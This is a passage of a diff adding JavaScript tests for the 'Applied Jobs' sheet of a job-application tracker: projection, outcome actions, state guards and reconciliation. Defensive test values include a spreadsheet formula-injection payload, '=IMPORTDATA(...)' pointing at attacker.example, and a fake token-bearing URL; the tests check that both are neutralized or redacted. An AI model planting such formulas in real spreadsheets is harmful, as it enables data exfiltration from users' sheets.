@@ -4,11 +4,15 @@ import test from "node:test";
 
 import {
   applyManualAction as applyManualActionCore,
+  buildAppliedJobsProjection,
   buildFunnelSummary,
   buildReviewQueue,
   buildReviewQueueProjection,
+  finalizeAppliedJobsCleanup,
   reasonForReview,
+  reconcileAppliedJobs,
   reconcileReviewQueue,
+  validateAppliedJobsConfig,
   validateReviewQueueConfig,
   processReviewActions as processReviewActionsCore
 } from "../src/review.mjs";
@@ -96,6 +100,7 @@ const job = (overrides = {}) => ({
 
 test("review configuration exposes required information and controlled actions", () => {
   assert.deepEqual(validateReviewQueueConfig(view, schema), []);
+  assert.deepEqual(validateAppliedJobsConfig(view, schema), []);
   assert.equal(view.review_queue.sheet, "Review Queue");
   assert.deepEqual(view.review_queue.visible_columns, [
     "Status",
@@ -119,6 +124,29 @@ test("review configuration exposes required information and controlled actions",
   assert.deepEqual(view.review_queue.generation_recovery, {
     statuses: ["retryable_error", "terminal_error"],
     failed_stage: "generation"
+  });
+  assert.equal(view.applied_jobs.sheet, "Applied Jobs");
+  assert.deepEqual(view.applied_jobs.visible_columns, [
+    "Applied at",
+    "Job title",
+    "Company",
+    "Generated message",
+    "Job link",
+    "Current outcome",
+    "Outcome updated at",
+    "Action"
+  ]);
+  assert.deepEqual(view.applied_jobs.hidden_columns, [
+    "canonical_job_id",
+    "source_state_guard"
+  ]);
+  assert.deepEqual(view.applied_jobs.actions, {
+    "No Response": "outcome_no_response",
+    Replied: "outcome_replied",
+    Interview: "outcome_interview",
+    Offer: "outcome_offer",
+    Rejected: "outcome_rejected",
+    "Clear Outcome": "clear_outcome"
   });
   for (const field of [
     "job_title",
@@ -162,6 +190,255 @@ test("review configuration exposes required information and controlled actions",
   assert.ok(view.manual_action_dropdown.includes("mark_reviewed"));
   assert.ok(view.manual_action_dropdown.includes("mark_applied"));
   assert.ok(view.manual_action_dropdown.includes("outcome_offer"));
+});
+
+test("Applied Jobs projects active and archived applications with active-source precedence", () => {
+  const activeApplied = job({
+    row_number: 4,
+    source_job_id: "applied-1",
+    canonical_job_id: "onlinejobs.ph:applied-1",
+    pipeline_status: "applied",
+    application_decision: "applied",
+    application_decided_at: "2026-07-28T09:00:00.000Z",
+    outcome: "interview",
+    outcome_at: "2026-07-28T09:30:00.000Z"
+  });
+  activeApplied.state_guard = stateGuard(activeApplied);
+  const overlappingArchive = {
+    ...activeApplied,
+    row_number: 20,
+    pipeline_status: "archived",
+    archived_from_status: "applied",
+    archived_at: "2026-07-28T09:15:00.000Z",
+    outcome: "replied",
+    outcome_at: "2026-07-28T09:20:00.000Z"
+  };
+  overlappingArchive.state_guard = stateGuard(overlappingArchive);
+  const archivedOffer = job({
+    row_number: 21,
+    source_job_id: "applied-2",
+    canonical_job_id: "onlinejobs.ph:applied-2",
+    pipeline_status: "archived",
+    archived_from_status: "applied",
+    archived_at: "2026-07-28T08:30:00.000Z",
+    application_decision: "applied",
+    application_decided_at: "2026-07-28T08:00:00.000Z",
+    outcome: "offer",
+    outcome_at: "2026-07-28T10:00:00.000Z"
+  });
+  archivedOffer.state_guard = stateGuard(archivedOffer);
+  const legacyApplied = job({
+    row_number: 22,
+    source_job_id: "applied-3",
+    canonical_job_id: "onlinejobs.ph:applied-3",
+    pipeline_status: "archived",
+    archived_from_status: "applied",
+    application_decision: "applied",
+    application_decided_at: "",
+    generated_message: "",
+    outcome: "",
+    outcome_at: ""
+  });
+  legacyApplied.state_guard = stateGuard(legacyApplied);
+  const excluded = [
+    job({
+      source_job_id: "ready-not-applied",
+      canonical_job_id: "onlinejobs.ph:ready-not-applied"
+    }),
+    job({
+      source_job_id: "skipped",
+      canonical_job_id: "onlinejobs.ph:skipped",
+      pipeline_status: "skipped",
+      application_decision: "skipped"
+    }),
+    job({
+      source_job_id: "archived-not-applied",
+      canonical_job_id: "onlinejobs.ph:archived-not-applied",
+      pipeline_status: "archived",
+      archived_from_status: "not_recommended",
+      application_decision: ""
+    })
+  ];
+
+  const projection = buildAppliedJobsProjection(
+    [activeApplied, ...excluded.slice(0, 2)],
+    [
+      overlappingArchive,
+      archivedOffer,
+      legacyApplied,
+      excluded[2]
+    ],
+    schema,
+    view,
+    now
+  );
+  assert.deepEqual(
+    projection.rows.map((row) => row.canonical_job_id),
+    [
+      "onlinejobs.ph:applied-1",
+      "onlinejobs.ph:applied-2",
+      "onlinejobs.ph:applied-3"
+    ]
+  );
+  assert.deepEqual(Object.keys(projection.rows[0]), view.applied_jobs.fields);
+  assert.equal(projection.rows[0]["Current outcome"], "interview");
+  assert.equal(
+    projection.rows[0].source_state_guard,
+    activeApplied.state_guard
+  );
+  assert.equal(projection.rows[1]["Current outcome"], "offer");
+  assert.equal(projection.rows[2]["Applied at"], "");
+  assert.equal(projection.rows[2]["Generated message"], "");
+  assert.equal(projection.invalid_records.length, 0);
+});
+
+test("Applied Jobs fails closed for ambiguous identities and neutralizes formulas", () => {
+  const duplicate = job({
+    row_number: 7,
+    source_job_id: "applied-duplicate",
+    canonical_job_id: "onlinejobs.ph:applied-duplicate",
+    pipeline_status: "archived",
+    archived_from_status: "applied",
+    application_decision: "applied",
+    application_decided_at: "2026-07-28T07:00:00.000Z"
+  });
+  const missingIdentity = job({
+    row_number: 8,
+    source: "",
+    source_job_id: "",
+    canonical_job_id: "",
+    canonical_url: "",
+    pipeline_status: "archived",
+    archived_from_status: "applied",
+    application_decision: "applied"
+  });
+  const formulaLike = job({
+    row_number: 9,
+    source_job_id: "applied-formula",
+    canonical_job_id: "onlinejobs.ph:applied-formula",
+    pipeline_status: "archived",
+    archived_from_status: "applied",
+    application_decision: "applied",
+    application_decided_at: "2026-07-28T06:00:00.000Z",
+    job_title: "\t\u200b=IMPORTDATA(\"https://attacker.example/title\")",
+    company: "\u00a0+malicious",
+    generated_message: "\ufeff@malicious",
+    canonical_url: "-malicious",
+    outcome: "replied"
+  });
+  formulaLike.state_guard = stateGuard(formulaLike);
+  const invalidIdentity = job({
+    row_number: 11,
+    source_job_id: "",
+    canonical_job_id:
+      "=token=do-not-log https://attacker.example/private",
+    canonical_url: "",
+    pipeline_status: "archived",
+    archived_from_status: "applied",
+    application_decision: "applied"
+  });
+  const staleGuard = job({
+    row_number: 12,
+    source_job_id: "applied-stale-guard",
+    canonical_job_id: "onlinejobs.ph:applied-stale-guard",
+    pipeline_status: "archived",
+    archived_from_status: "applied",
+    application_decision: "applied",
+    outcome: "offer",
+    state_guard: "onlinejobs.ph:applied-stale-guard|stale"
+  });
+  const invalidActiveArchiveFallback = {
+    ...staleGuard,
+    row_number: 13,
+    pipeline_status: "archived",
+    archived_from_status: "applied",
+    state_guard: ""
+  };
+  invalidActiveArchiveFallback.state_guard = stateGuard(
+    invalidActiveArchiveFallback
+  );
+  const projection = buildAppliedJobsProjection(
+    [staleGuard],
+    [
+      duplicate,
+      { ...duplicate, row_number: 10 },
+      missingIdentity,
+      formulaLike,
+      invalidIdentity,
+      invalidActiveArchiveFallback
+    ],
+    schema,
+    view,
+    now
+  );
+  assert.equal(projection.rows.length, 1);
+  assert.match(projection.rows[0]["Job title"], /^'\t\u200b=/);
+  assert.match(projection.rows[0].Company, /^'\u00a0\+/);
+  assert.match(projection.rows[0]["Generated message"], /^'\ufeff@/);
+  assert.equal(projection.rows[0]["Job link"], "");
+  assert.deepEqual(
+    projection.invalid_records.map((entry) => entry.error).sort(),
+    [
+      "eligible applied record has duplicate canonical identity",
+      "eligible applied record has invalid canonical identity",
+      "eligible applied record is missing canonical identity",
+      "source record has stale state guard"
+    ]
+  );
+  const invalidIdentityDiagnostic = projection.invalid_records.find(
+    (entry) => entry.error.includes("invalid canonical identity")
+  );
+  assert.doesNotMatch(
+    invalidIdentityDiagnostic.canonical_job_id,
+    /do-not-log|attacker\.example/
+  );
+  assert.match(
+    invalidIdentityDiagnostic.canonical_job_id,
+    /token=\[redacted\] \[url\]/
+  );
+});
+
+test("Applied Jobs orders tied and invalid timestamps by canonical identity", () => {
+  const applied = (identity, appliedAt, rowNumber) => {
+    const record = job({
+      row_number: rowNumber,
+      source_job_id: identity.split(":").at(-1),
+      canonical_job_id: identity,
+      pipeline_status: "archived",
+      archived_from_status: "applied",
+      application_decision: "applied",
+      application_decided_at: appliedAt
+    });
+    record.state_guard = stateGuard(record);
+    return record;
+  };
+  const projection = buildAppliedJobsProjection(
+    [],
+    [
+      applied("onlinejobs.ph:invalid-z", "not-a-date", 11),
+      applied("onlinejobs.ph:tied-b", "2026-07-28T10:00:00.000Z", 12),
+      applied("onlinejobs.ph:missing-a", "", 13),
+      applied("onlinejobs.ph:tied-a", "2026-07-28T10:00:00.000Z", 14),
+      applied("onlinejobs.ph:invalid-a", "also-not-a-date", 15)
+    ],
+    schema,
+    view,
+    now
+  );
+  assert.deepEqual(
+    projection.rows.map((row) => row.canonical_job_id),
+    [
+      "onlinejobs.ph:tied-a",
+      "onlinejobs.ph:tied-b",
+      "onlinejobs.ph:invalid-a",
+      "onlinejobs.ph:invalid-z",
+      "onlinejobs.ph:missing-a"
+    ]
+  );
+  assert.deepEqual(
+    projection.rows.slice(2).map((row) => row["Applied at"]),
+    ["", "", ""]
+  );
 });
 
 test("first instrumented review is explicit and preserves its original timestamp", () => {
@@ -547,6 +824,8 @@ test("active and archived action processing stay in their ownership boundary", (
     [
       job({
         row_number: 10,
+        source_job_id: "archived-boundary",
+        canonical_job_id: "onlinejobs.ph:archived-boundary",
         pipeline_status: "archived",
         archived_from_status: "applied",
         application_decision: "applied",
@@ -557,9 +836,516 @@ test("active and archived action processing stay in their ownership boundary", (
     now
   );
   assert.equal(processed.active_updates.length, 1);
+  assert.equal(processed.active_claims.length, 1);
   assert.equal(processed.archive_updates.length, 1);
+  assert.equal(processed.archive_claims.length, 1);
   assert.equal(processed.archive_updates[0].outcome, "replied");
+  assert.match(
+    processed.archive_updates[0].processing_commit_guard,
+    /^commit:review:/
+  );
   assert.deepEqual(processed.invalid_actions, []);
+});
+
+test("Applied Jobs actions update guarded active or archived authoritative records", () => {
+  const activeApplied = job({
+    row_number: 31,
+    source_job_id: "applied-action-active",
+    canonical_job_id: "onlinejobs.ph:applied-action-active",
+    pipeline_status: "applied",
+    application_decision: "applied",
+    application_decided_at: "2026-07-27T10:00:00.000Z",
+    application_snapshot_at: "2026-07-27T10:00:00.000Z",
+    outcome: "",
+    outcome_at: "",
+    outcome_events: []
+  });
+  activeApplied.state_guard = stateGuard(activeApplied);
+  const activeResult = processReviewActions(
+    [activeApplied],
+    [],
+    schema,
+    now,
+    {
+      executionId: "applied-active",
+      reviewConfig: view,
+      appliedJobsRows: [
+        {
+          row_number: 5,
+          Action: "Replied",
+          canonical_job_id: activeApplied.canonical_job_id,
+          source_state_guard: activeApplied.state_guard
+        }
+      ]
+    }
+  );
+  assert.deepEqual(activeResult.invalid_actions, []);
+  assert.equal(activeResult.active_claims.length, 1);
+  assert.equal(activeResult.archive_claims.length, 0);
+  assert.equal(activeResult.active_updates[0].outcome, "replied");
+  assert.equal(activeResult.active_updates[0].outcome_at, now);
+  assert.deepEqual(
+    activeResult.active_updates[0].outcome_events.map((event) => event.type),
+    ["replied"]
+  );
+  assert.equal(
+    activeResult.active_updates[0].application_decided_at,
+    activeApplied.application_decided_at
+  );
+  assert.equal(
+    activeResult.active_updates[0].application_snapshot_at,
+    activeApplied.application_snapshot_at
+  );
+  assert.equal(
+    activeResult.active_updates[0].generated_message,
+    activeApplied.generated_message
+  );
+  assert.equal(activeResult.processed_applied_actions.length, 1);
+  assert.equal(
+    activeResult.processed_applied_actions[0].source_location,
+    "active"
+  );
+  assert.match(
+    activeResult.active_claims[0].processing_commit_guard,
+    /^commit:review:onlinejobs\.ph:applied-action-active:/
+  );
+
+  const archivedApplied = job({
+    row_number: 41,
+    source_job_id: "applied-action-archive",
+    canonical_job_id: "onlinejobs.ph:applied-action-archive",
+    pipeline_status: "archived",
+    archived_from_status: "applied",
+    archived_at: "2026-07-27T11:00:00.000Z",
+    application_decision: "applied",
+    application_decided_at: "2026-07-27T10:00:00.000Z",
+    application_snapshot_at: "2026-07-27T10:00:00.000Z",
+    outcome: "interview",
+    outcome_at: "2026-07-28T08:00:00.000Z",
+    outcome_events: [
+      {
+        id: "interview-1",
+        type: "interview",
+        at: "2026-07-28T08:00:00.000Z"
+      }
+    ]
+  });
+  archivedApplied.state_guard = stateGuard(archivedApplied);
+  const archiveResult = processReviewActions(
+    [],
+    [archivedApplied],
+    schema,
+    now,
+    {
+      executionId: "applied-archive",
+      reviewConfig: view,
+      appliedJobsRows: [
+        {
+          row_number: 6,
+          Action: "Offer",
+          canonical_job_id: archivedApplied.canonical_job_id,
+          source_state_guard: archivedApplied.state_guard
+        }
+      ]
+    }
+  );
+  assert.deepEqual(archiveResult.invalid_actions, []);
+  assert.equal(archiveResult.active_claims.length, 0);
+  assert.equal(archiveResult.archive_claims.length, 1);
+  assert.equal(
+    archiveResult.archive_claims[0].state_guard,
+    archivedApplied.state_guard
+  );
+  assert.equal(archiveResult.archive_updates[0].outcome, "offer");
+  assert.equal(
+    archiveResult.archive_updates[0].archived_at,
+    archivedApplied.archived_at
+  );
+  assert.deepEqual(
+    archiveResult.archive_updates[0].outcome_events.map((event) => event.type),
+    ["interview", "offer"]
+  );
+  assert.equal(
+    archiveResult.processed_applied_actions[0].source_location,
+    "archive"
+  );
+  assert.match(
+    archiveResult.archive_claims[0].processing_commit_guard,
+    /^commit:review:onlinejobs\.ph:applied-action-archive:/
+  );
+  assert.notEqual(
+    activeResult.active_claims[0].processing_commit_guard,
+    archiveResult.archive_claims[0].processing_commit_guard
+  );
+});
+
+test("Applied Jobs uses active precedence and direct source actions win conflicts", () => {
+  const activeApplied = job({
+    row_number: 51,
+    source_job_id: "applied-overlap",
+    canonical_job_id: "onlinejobs.ph:applied-overlap",
+    pipeline_status: "applied",
+    application_decision: "applied",
+    application_decided_at: "2026-07-27T10:00:00.000Z",
+    outcome: ""
+  });
+  activeApplied.state_guard = stateGuard(activeApplied);
+  const archivedApplied = {
+    ...activeApplied,
+    row_number: 61,
+    pipeline_status: "archived",
+    archived_from_status: "applied",
+    archived_at: "2026-07-27T11:00:00.000Z"
+  };
+  archivedApplied.state_guard = stateGuard(archivedApplied);
+  const activeWins = processReviewActions(
+    [activeApplied],
+    [archivedApplied],
+    schema,
+    now,
+    {
+      executionId: "applied-overlap",
+      reviewConfig: view,
+      appliedJobsRows: [
+        {
+          row_number: 7,
+          Action: "Interview",
+          canonical_job_id: activeApplied.canonical_job_id,
+          source_state_guard: activeApplied.state_guard
+        }
+      ]
+    }
+  );
+  assert.equal(activeWins.active_updates.length, 1);
+  assert.equal(activeWins.archive_updates.length, 0);
+  assert.equal(activeWins.active_updates[0].outcome, "interview");
+
+  const directWins = processReviewActions(
+    [{ ...activeApplied, manual_action: "outcome_rejected" }],
+    [archivedApplied],
+    schema,
+    now,
+    {
+      executionId: "applied-direct-conflict",
+      reviewConfig: view,
+      appliedJobsRows: [
+        {
+          row_number: 8,
+          Action: "Offer",
+          canonical_job_id: activeApplied.canonical_job_id,
+          source_state_guard: activeApplied.state_guard
+        }
+      ]
+    }
+  );
+  assert.equal(directWins.active_updates.length, 1);
+  assert.equal(directWins.active_updates[0].outcome, "rejected");
+  assert.equal(directWins.processed_applied_actions.length, 0);
+  assert.equal(directWins.invalid_actions.length, 1);
+  assert.match(directWins.invalid_actions[0].error, /conflicts with Sheet1/);
+
+  const staleArchiveDirect = processReviewActions(
+    [activeApplied],
+    [{ ...archivedApplied, manual_action: "outcome_offer" }],
+    schema,
+    now,
+    {
+      executionId: "applied-archive-direct-overlap",
+      reviewConfig: view
+    }
+  );
+  assert.deepEqual(staleArchiveDirect.active_updates, []);
+  assert.deepEqual(staleArchiveDirect.archive_updates, []);
+  assert.equal(staleArchiveDirect.invalid_actions.length, 1);
+  assert.equal(staleArchiveDirect.invalid_actions[0].location, "archive");
+  assert.match(
+    staleArchiveDirect.invalid_actions[0].error,
+    /active authoritative source/
+  );
+});
+
+test("Applied Jobs actions fail closed for stale, forged, malformed, and ambiguous state", () => {
+  const applied = job({
+    row_number: 71,
+    source_job_id: "applied-invalid",
+    canonical_job_id: "onlinejobs.ph:applied-invalid",
+    pipeline_status: "applied",
+    application_decision: "applied",
+    application_decided_at: "2026-07-27T10:00:00.000Z",
+    outcome_events: []
+  });
+  applied.state_guard = stateGuard(applied);
+  const action = (Action, sourceStateGuard = applied.state_guard) => ({
+    row_number: 9,
+    Action,
+    canonical_job_id: applied.canonical_job_id,
+    source_state_guard: sourceStateGuard
+  });
+
+  const stale = processReviewActions(
+    [applied],
+    [],
+    schema,
+    now,
+    {
+      executionId: "applied-stale",
+      reviewConfig: view,
+      appliedJobsRows: [action("Replied", "stale")]
+    }
+  );
+  assert.deepEqual(stale.active_updates, []);
+  assert.match(stale.invalid_actions[0].error, /stale Applied Jobs action/);
+
+  const driftedSource = {
+    ...applied,
+    outcome: "offer",
+    outcome_at: now,
+    outcome_events: [{ id: "drifted-offer", type: "offer", at: now }]
+  };
+  const sourceGuardDrift = processReviewActions(
+    [driftedSource],
+    [],
+    schema,
+    now,
+    {
+      executionId: "applied-source-guard-drift",
+      reviewConfig: view,
+      appliedJobsRows: [action("Rejected")]
+    }
+  );
+  assert.deepEqual(sourceGuardDrift.active_updates, []);
+  assert.match(
+    sourceGuardDrift.invalid_actions[0].error,
+    /source state guard integrity mismatch/
+  );
+
+  const forged = processReviewActions(
+    [applied],
+    [],
+    schema,
+    now,
+    {
+      executionId: "applied-forged",
+      reviewConfig: view,
+      appliedJobsRows: [action("Delete Everything")]
+    }
+  );
+  assert.deepEqual(forged.active_updates, []);
+  assert.match(forged.invalid_actions[0].error, /unsupported Applied Jobs/);
+
+  const diagnosticSafe = processReviewActions(
+    [],
+    [],
+    schema,
+    now,
+    {
+      executionId: "applied-sanitized-diagnostic",
+      reviewConfig: view,
+      appliedJobsRows: [
+        {
+          row_number: 99,
+          Action: "Offer",
+          canonical_job_id:
+            "=token=do-not-log https://attacker.example/private",
+          source_state_guard: "forged"
+        }
+      ]
+    }
+  );
+  assert.equal(diagnosticSafe.invalid_actions.length, 1);
+  assert.doesNotMatch(
+    diagnosticSafe.invalid_actions[0].canonical_job_id,
+    /do-not-log|attacker\.example/
+  );
+  assert.match(
+    diagnosticSafe.invalid_actions[0].canonical_job_id,
+    /token=\[redacted\] \[url\]/
+  );
+
+  const nonApplied = {
+    ...applied,
+    pipeline_status: "skipped",
+    application_decision: "skipped"
+  };
+  nonApplied.state_guard = stateGuard(nonApplied);
+  const invalidDecision = processReviewActions(
+    [nonApplied],
+    [],
+    schema,
+    now,
+    {
+      executionId: "applied-invalid-decision",
+      reviewConfig: view,
+      appliedJobsRows: [
+        {
+          ...action("Offer", nonApplied.state_guard),
+          canonical_job_id: nonApplied.canonical_job_id
+        }
+      ]
+    }
+  );
+  assert.deepEqual(invalidDecision.active_updates, []);
+  assert.match(
+    invalidDecision.invalid_actions[0].error,
+    /outcomes require an applied decision/
+  );
+
+  const malformed = { ...applied, outcome_events: "not-json" };
+  malformed.state_guard = stateGuard(malformed);
+  const malformedResult = processReviewActions(
+    [malformed],
+    [],
+    schema,
+    now,
+    {
+      executionId: "applied-malformed",
+      reviewConfig: view,
+      appliedJobsRows: [
+        {
+          ...action("Interview", malformed.state_guard),
+          canonical_job_id: malformed.canonical_job_id
+        }
+      ]
+    }
+  );
+  assert.deepEqual(malformedResult.active_updates, []);
+  assert.match(
+    malformedResult.invalid_actions[0].error,
+    /outcome history is malformed/
+  );
+
+  const duplicate = processReviewActions(
+    [applied, { ...applied, row_number: 72 }],
+    [],
+    schema,
+    now,
+    {
+      executionId: "applied-duplicate",
+      reviewConfig: view,
+      appliedJobsRows: [action("Rejected")]
+    }
+  );
+  assert.deepEqual(duplicate.active_updates, []);
+  assert.match(duplicate.invalid_actions[0].error, /duplicate source/);
+
+  const duplicateProjection = processReviewActions(
+    [applied],
+    [],
+    schema,
+    now,
+    {
+      executionId: "applied-duplicate-projection",
+      reviewConfig: view,
+      appliedJobsRows: [
+        { ...action(""), row_number: 2 },
+        { ...action("Offer"), row_number: 3 }
+      ]
+    }
+  );
+  assert.deepEqual(duplicateProjection.active_updates, []);
+  assert.match(
+    duplicateProjection.invalid_actions[0].error,
+    /duplicate projection identity/
+  );
+});
+
+test("Applied Jobs outcome actions are explicit, append-safe, and idempotent", () => {
+  const repliedAt = "2026-07-28T08:00:00.000Z";
+  const replied = job({
+    row_number: 81,
+    source_job_id: "applied-idempotent",
+    canonical_job_id: "onlinejobs.ph:applied-idempotent",
+    pipeline_status: "archived",
+    archived_from_status: "applied",
+    application_decision: "applied",
+    application_decided_at: "2026-07-27T10:00:00.000Z",
+    outcome: "replied",
+    outcome_at: repliedAt,
+    outcome_events: [
+      { id: "reply-1", type: "replied", at: repliedAt }
+    ]
+  });
+  replied.state_guard = stateGuard(replied);
+  const run = (record, Action, executionId) =>
+    processReviewActions([], [record], schema, now, {
+      executionId,
+      reviewConfig: view,
+      appliedJobsRows: [
+        {
+          row_number: 12,
+          Action,
+          canonical_job_id: record.canonical_job_id,
+          source_state_guard: record.state_guard
+        }
+      ]
+    });
+
+  const duplicate = run(replied, "Replied", "applied-repeat");
+  assert.equal(duplicate.archive_updates[0].outcome, "replied");
+  assert.equal(duplicate.archive_updates[0].outcome_at, repliedAt);
+  assert.equal(duplicate.archive_updates[0].outcome_events.length, 1);
+
+  const cleared = run(replied, "Clear Outcome", "applied-clear");
+  assert.equal(cleared.archive_updates[0].outcome, "");
+  assert.deepEqual(
+    cleared.archive_updates[0].outcome_events.map((event) => event.type),
+    ["replied", "correction"]
+  );
+
+  const blank = {
+    ...replied,
+    outcome: "",
+    outcome_at: "",
+    outcome_events: []
+  };
+  blank.state_guard = stateGuard(blank);
+  const clearedBlank = run(blank, "Clear Outcome", "applied-clear-blank");
+  assert.equal(clearedBlank.archive_updates[0].outcome, "");
+  assert.deepEqual(clearedBlank.archive_updates[0].outcome_events, []);
+
+  const noResponse = run(blank, "No Response", "applied-no-response");
+  assert.equal(noResponse.archive_updates[0].outcome, "no_response");
+  assert.deepEqual(
+    noResponse.archive_updates[0].outcome_events.map((event) => event.type),
+    ["no_response"]
+  );
+
+  const rejected = run(blank, "Rejected", "applied-rejected");
+  assert.equal(rejected.archive_updates[0].outcome, "rejected");
+  assert.deepEqual(
+    rejected.archive_updates[0].outcome_events.map((event) => event.type),
+    ["rejected"]
+  );
+  assert.equal(
+    rejected.archive_updates[0].canonical_job_id,
+    blank.canonical_job_id
+  );
+  assert.equal(
+    rejected.archive_updates[0].application_decision,
+    blank.application_decision
+  );
+  assert.equal(
+    rejected.archive_updates[0].application_decided_at,
+    blank.application_decided_at
+  );
+  assert.equal(
+    rejected.archive_updates[0].application_snapshot_at,
+    blank.application_snapshot_at
+  );
+  assert.equal(
+    rejected.archive_updates[0].generated_message,
+    blank.generated_message
+  );
+  assert.equal(
+    rejected.archive_updates[0].archived_at,
+    blank.archived_at
+  );
+  assert.equal(
+    buildAppliedJobsProjection([], [blank], schema, view, now).rows[0][
+      "Current outcome"
+    ],
+    ""
+  );
 });
 
 test("priority queue orders ready and high-match jobs before review and recovery", () => {
@@ -1359,6 +2145,492 @@ test("queue reconciliation retains an action until its guarded source write is c
   assert.deepEqual(cleanupRetry.delete_rows, [{ row_number: 2 }]);
   assert.deepEqual(cleanupRetry.queue_rows, []);
   assert.equal(cleanupRetry.protected_action_count, 0);
+});
+
+test("Applied Jobs reconciliation preserves unconfirmed and concurrent actions", () => {
+  const source = job({
+    row_number: 91,
+    source_job_id: "applied-reconcile",
+    canonical_job_id: "onlinejobs.ph:applied-reconcile",
+    pipeline_status: "applied",
+    application_decision: "applied",
+    application_decided_at: "2026-07-27T10:00:00.000Z",
+    outcome: "",
+    outcome_events: []
+  });
+  source.state_guard = stateGuard(source);
+  const pending = {
+    row_number: 2,
+    Action: "Interview",
+    canonical_job_id: source.canonical_job_id,
+    source_state_guard: source.state_guard
+  };
+  const unconfirmed = reconcileAppliedJobs(
+    [source],
+    [],
+    [pending],
+    [pending],
+    schema,
+    view,
+    now
+  );
+  assert.deepEqual(unconfirmed.clear_rows, []);
+  assert.deepEqual(unconfirmed.applied_rows, []);
+  assert.deepEqual(unconfirmed.rebase_rows, []);
+  assert.equal(unconfirmed.protected_action_count, 1);
+
+  const concurrent = {
+    ...pending,
+    row_number: 3,
+    Action: "Offer"
+  };
+  const protectsLateEdit = reconcileAppliedJobs(
+    [source],
+    [],
+    [concurrent],
+    [{ ...pending, row_number: 2, Action: "" }],
+    schema,
+    view,
+    now
+  );
+  assert.deepEqual(protectsLateEdit.clear_rows, []);
+  assert.deepEqual(protectsLateEdit.applied_rows, []);
+  assert.equal(protectsLateEdit.rebase_rows[0].Action, "Offer");
+  assert.equal(protectsLateEdit.protected_action_count, 1);
+});
+
+test("Applied Jobs rebases a concurrent second action for the next guarded run", () => {
+  const source = job({
+    row_number: 96,
+    source_job_id: "applied-second-action",
+    canonical_job_id: "onlinejobs.ph:applied-second-action",
+    pipeline_status: "applied",
+    application_decision: "applied",
+    application_decided_at: "2026-07-27T10:00:00.000Z",
+    outcome: "",
+    outcome_events: []
+  });
+  source.state_guard = stateGuard(source);
+  const firstProjection = {
+    row_number: 2,
+    Action: "Offer",
+    canonical_job_id: source.canonical_job_id,
+    source_state_guard: source.state_guard
+  };
+  const first = processReviewActions(
+    [source],
+    [],
+    schema,
+    now,
+    {
+      executionId: "applied-first-action",
+      reviewConfig: view,
+      appliedJobsRows: [firstProjection]
+    }
+  );
+  assert.equal(first.active_applied_updates[0].outcome, "offer");
+  const committed = first.active_applied_updates[0];
+  const secondProjection = {
+    ...firstProjection,
+    Action: "Rejected"
+  };
+  const reconciliation = reconcileAppliedJobs(
+    [committed],
+    [],
+    [secondProjection],
+    [firstProjection],
+    schema,
+    view,
+    now
+  );
+  assert.deepEqual(reconciliation.clear_rows, []);
+  assert.deepEqual(reconciliation.applied_rows, []);
+  assert.equal(reconciliation.rebase_rows.length, 1);
+  assert.equal(reconciliation.rebase_rows[0].Action, "Rejected");
+  assert.equal(
+    reconciliation.rebase_rows[0].source_state_guard,
+    committed.state_guard
+  );
+
+  const second = processReviewActions(
+    [committed],
+    [],
+    schema,
+    "2026-07-29T13:00:00.000Z",
+    {
+      executionId: "applied-second-action",
+      reviewConfig: view,
+      appliedJobsRows: [reconciliation.rebase_rows[0]]
+    }
+  );
+  assert.equal(second.invalid_actions.length, 0);
+  assert.equal(second.active_applied_updates[0].outcome, "rejected");
+  assert.deepEqual(
+    second.active_applied_updates[0].outcome_events.map((event) => event.type),
+    ["offer", "rejected"]
+  );
+});
+
+test("Applied Jobs does not rebase an unchanged action across a direct outcome", () => {
+  const source = job({
+    row_number: 97,
+    source_job_id: "applied-direct-rebase",
+    canonical_job_id: "onlinejobs.ph:applied-direct-rebase",
+    pipeline_status: "applied",
+    application_decision: "applied",
+    application_decided_at: "2026-07-27T10:00:00.000Z",
+    outcome: "interview",
+    outcome_at: "2026-07-28T08:00:00.000Z",
+    outcome_events: [
+      {
+        id: "direct-rebase-interview",
+        type: "interview",
+        at: "2026-07-28T08:00:00.000Z"
+      }
+    ]
+  });
+  source.state_guard = stateGuard(source);
+  const projected = {
+    row_number: 2,
+    Action: "Offer",
+    canonical_job_id: source.canonical_job_id,
+    source_state_guard: source.state_guard
+  };
+  const directRejected = applyManualAction(
+    { ...source, manual_action: "outcome_rejected" },
+    schema,
+    now
+  ).record;
+  const reconciliation = reconcileAppliedJobs(
+    [directRejected],
+    [],
+    [
+      {
+        ...projected,
+        row_number: 3,
+        source_state_guard: directRejected.state_guard
+      }
+    ],
+    [projected],
+    schema,
+    view,
+    now
+  );
+  assert.deepEqual(reconciliation.clear_rows, []);
+  assert.deepEqual(reconciliation.rebase_rows, []);
+  assert.equal(reconciliation.protected_action_count, 1);
+
+  const retry = processReviewActions(
+    [directRejected],
+    [],
+    schema,
+    "2026-07-29T13:05:00.000Z",
+    {
+      executionId: "applied-direct-rebase-retry",
+      reviewConfig: view,
+      appliedJobsRows: [projected]
+    }
+  );
+  assert.deepEqual(retry.active_updates, []);
+  assert.match(retry.invalid_actions[0].error, /stale Applied Jobs action/);
+  assert.equal(directRejected.outcome, "rejected");
+});
+
+test("Applied Jobs reconciliation refreshes confirmed actions and empty state", () => {
+  const source = job({
+    row_number: 101,
+    source_job_id: "applied-refresh",
+    canonical_job_id: "onlinejobs.ph:applied-refresh",
+    pipeline_status: "archived",
+    archived_from_status: "applied",
+    application_decision: "applied",
+    application_decided_at: "2026-07-27T10:00:00.000Z",
+    outcome: "",
+    outcome_events: []
+  });
+  source.state_guard = stateGuard(source);
+  const pending = {
+    row_number: 2,
+    Action: "Replied",
+    canonical_job_id: source.canonical_job_id,
+    source_state_guard: source.state_guard
+  };
+  const updated = {
+    ...source,
+    outcome: "replied",
+    outcome_at: now,
+    outcome_events: [{ id: "reply-1", type: "replied", at: now }],
+    processing_commit_guard: "commit:review:confirmed"
+  };
+  updated.state_guard = stateGuard(updated);
+  const refreshed = reconcileAppliedJobs(
+    [],
+    [updated],
+    [pending],
+    [pending],
+    schema,
+    view,
+    now,
+    {
+      processedActions: [
+        {
+          canonical_job_id: source.canonical_job_id,
+          manual_action: "outcome_replied",
+          source_state_guard: source.state_guard,
+          processing_commit_guard: "commit:review:confirmed"
+        }
+      ],
+      confirmedCommitGuards: ["commit:review:confirmed"]
+    }
+  );
+  assert.deepEqual(refreshed.clear_rows, []);
+  assert.equal(refreshed.applied_rows.length, 1);
+  assert.equal(refreshed.applied_rows[0]["Current outcome"], "replied");
+  assert.equal(refreshed.applied_rows[0].Action, "");
+  assert.equal(refreshed.protected_action_count, 0);
+
+  const markerOnly = {
